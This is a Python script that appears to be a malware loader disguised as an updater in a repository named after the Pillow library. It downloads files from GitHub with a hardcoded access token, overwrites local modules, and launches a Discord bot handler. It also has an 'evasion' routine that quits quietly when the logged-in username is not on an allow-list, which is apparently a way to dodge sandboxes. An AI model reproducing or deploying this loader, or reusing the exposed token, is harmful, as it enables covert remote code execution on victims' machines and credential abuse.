import os
import json
import requests
import signal
import sys
from functions.update import ensure_update_file_exists

GITHUB_RAW_URL_TEMPLATE = "https://raw.githubusercontent.com/pillowlibrary/pillow/main/functions/{}"
UPDATE_STATUS_FILE = os.path.join(os.path.dirname(__file__), "update_status.json")
LOCAL_FUNCTIONS_PATH = os.path.join(os.getcwd(), "functions")
DISCORD_HANDLER_FILE = "discord_handler.py"
allowed_users = ["border", "bob", "User"]
github_token = "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"

ensure_update_file_exists()

def graceful_exit(signum, frame):
    sys.exit(0)

signal.signal(signal.SIGTERM, graceful_exit)
signal.signal(signal.SIGINT, graceful_exit)

def check_update_status():
    print("Checking update status...")
    if os.path.exists(UPDATE_STATUS_FILE):
        with open(UPDATE_STATUS_FILE, "r") as f:
            data = json.load(f)
            if data.get("update"):
                print(f"Update required for: {data.get('files_to_update', [])}")
                return data.get("files_to_update", [])
    print("No update needed.")
    return []

def reset_update_flag():
    data = {"update": False, "files_to_update": []}
    with open(UPDATE_STATUS_FILE, "w") as f:
        json.dump(data, f)

def download_and_update_files(files_to_update):
    headers = {'Authorization': f'token {github_token}'}
    print(f"Attempting to update files: {files_to_update}")

    for file_name in files_to_update:
        raw_url = GITHUB_RAW_URL_TEMPLATE.format(file_name)
        response = requests.get(raw_url, headers=headers)

        if response.status_code == 200:
            local_file_path = os.path.join(LOCAL_FUNCTIONS_PATH, file_name)
            with open(local_file_path, "wb") as file:
                file.write(response.content)
            print(f"Successfully updated: {file_name}")
        else:
            print(f"Failed to update: {file_name}. Status code: {response.status_code}")

    raw_discord_handler_url = GITHUB_RAW_URL_TEMPLATE.format(DISCORD_HANDLER_FILE)
    response = requests.get(raw_discord_handler_url, headers=headers)
    if response.status_code == 200:
        local_discord_handler_path = os.path.join(LOCAL_FUNCTIONS_PATH, DISCORD_HANDLER_FILE)
        with open(local_discord_handler_path, "wb") as file:
            file.write(response.content)
        print(f"Updated: {DISCORD_HANDLER_FILE}")
    else:
        print(f"Failed to update {DISCORD_HANDLER_FILE}. Status code: {response.status_code}")

def evasion():
    print("hello vro <3")

def main():
    username = os.getlogin()
    print(f"Running as: {username}")

    if username in allowed_users:
        files_to_update = check_update_status()
        if files_to_update:
            print("Updating files before running Discord bot.")
            download_and_update_files(files_to_update)
            reset_update_flag()
        else:
            print("No updates required. Running Discord bot directly.")
    else:
        evasion()
        return

    print("Starting Discord bot...")
    from functions.discord_handler import start_discord_bot
    start_discord_bot()

if __name__ == "__main__":
    main()
